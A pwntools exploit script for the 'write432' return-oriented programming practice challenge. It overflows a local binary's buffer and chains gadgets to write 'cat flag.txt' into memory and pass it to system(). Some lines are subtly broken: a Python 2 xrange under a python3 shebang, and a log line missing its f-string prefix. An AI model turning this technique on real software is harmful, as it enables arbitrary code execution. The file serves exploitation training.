#!/usr/bin/python3

from pwn import *

#context.log_level = 'DEBUG'

mov_ebp_into_edi = 0x08048670
pop_edi_ebp_addr = 0x080486da

def rop_move(dst, dword):
    rop = ''
    rop += p32(pop_edi_ebp_addr)
    rop += p32(dst)
    rop += dword
    rop += p32(mov_ebp_into_edi)
    return rop
    
filename = './write432'

binary = ELF(filename)
rop = ROP(filename)

padding = 'A' * 44
bss_addr = binary.bss(0)
system_addr = binary.symbols['system']

payload = padding

# move 'cat flag.txt\x00\x00\x00\x00' to bss
command = 'cat flag.txt\x00\x00\x00\x00'
for index in xrange(0, len(command), 4):
    payload += rop_move(bss_addr+index, command[index:index+4])

# system(*'cat flag.txt')
payload += p32(system_addr)
payload += 'JUNK'
payload += p32(bss_addr)

p = process(filename)

gdb.attach(p, '''
        break *%s
        continue
        ''' % pop_edi_ebp_addr)
"""
gdb.attach(p, '''
        break *%s
        continue
        ''' % binary.symbols['system'])
"""

p.recvuntil('> ')

p.sendline(payload)

p.sendline('cat flag.txt')

log.info("Flag: {p.recv(1024).decode()}")
